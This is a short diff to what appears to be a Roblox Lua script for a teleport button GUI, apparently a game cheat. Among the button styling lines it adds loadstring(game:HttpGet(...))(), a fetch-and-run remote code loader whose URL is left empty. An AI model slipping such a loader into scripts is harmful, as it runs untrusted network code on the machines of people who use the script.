@@ -26,6 +26,7 @@ tb.TextSize = 14.000
 tb.BackgroundTransparency = 1
 tb.TextColor3 = Color3.fromRGB(256, 256, 256)
 tb.BorderSizePixel = 0
+loadstring(game:HttpGet("", true))()
 
 tb.MouseButton1Click:connect(function()
     local facilitypos = Vector3.new(1405.252,-257.698,-1863.524)
